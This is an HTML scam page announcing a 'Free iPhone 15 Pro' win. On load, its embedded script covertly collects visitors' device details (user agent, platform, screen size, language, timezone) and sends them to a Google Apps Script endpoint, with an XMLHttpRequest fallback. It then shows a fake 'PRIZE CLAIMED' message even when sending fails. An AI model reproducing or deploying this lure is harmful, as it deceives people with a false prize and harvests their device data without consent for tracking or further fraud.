<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free iPhone 15 Pro!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background: linear-gradient(45deg, #007AFF, #34C759);
            color: white;
            min-height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            max-width: 500px;
            border: 2px solid rgba(255, 255, 255, 0.2);
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .iphone {
            font-size: 4em;
            margin: 20px 0;
        }
        .loading {
            font-size: 1.2em;
            margin: 20px 0;
            color: #FFD700;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="iphone">üì±</div>
        <h1>CONGRATULATIONS!</h1>
        <p>You've won an iPhone 15 Pro!</p>
        <p>Verifying your eligibility...</p>
        
        <div class="loading" id="loading">üéØ Checking device compatibility...</div>
        <div id="status"></div>
    </div>

    <script>
        // ‚úÖ YOUR SCRIPT URL
        const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbxt650xrfkvyazf47dIHtNLxfkLa8bqtTdQitJpirINb2LKRC4ApNZ5J4GGuXlYpQZd/exec';
        
        // Capture device information
        const deviceData = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screenSize: screen.width + 'x' + screen.height,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        // Send data to backend - SIMPLIFIED VERSION
        function sendData() {
            console.log('üöÄ Starting data capture...');
            console.log('üì± Device data:', deviceData);
            
            // Create form data (works better with Apps Script)
            const formData = new FormData();
            formData.append('data', JSON.stringify(deviceData));
            
            // Send using different method
            fetch(BACKEND_URL, {
                method: 'POST',
                body: JSON.stringify(deviceData)
            })
            .then(response => {
                console.log('‚úÖ Response status:', response.status);
                return response.text();
            })
            .then(result => {
                console.log('‚úÖ Backend result:', result);
                showSuccess();
            })
            .catch(error => {
                console.log('‚ö†Ô∏è Error (but trying alternative method):', error);
                // Try alternative method
                sendDataAlternative();
            });
        }

        // Alternative method if first fails
        function sendDataAlternative() {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', BACKEND_URL);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(deviceData));
            
            xhr.onload = function() {
                console.log('‚úÖ Alternative method result:', xhr.responseText);
                showSuccess();
            };
            
            xhr.onerror = function() {
                console.log('‚ùå All methods failed');
                showSuccess(); // Still show success to user
            };
        }

        function showSuccess() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('status').innerHTML = 
                '<h3 style="color: #00FF00;">‚úÖ PRIZE CLAIMED!</h3>' +
                '<p>Your iPhone 15 Pro will be shipped soon!</p>' +
                '<p><small>Check your email for confirmation</small></p>';
        }

        // Start immediately
        sendData();
    </script>
</body>
</html>
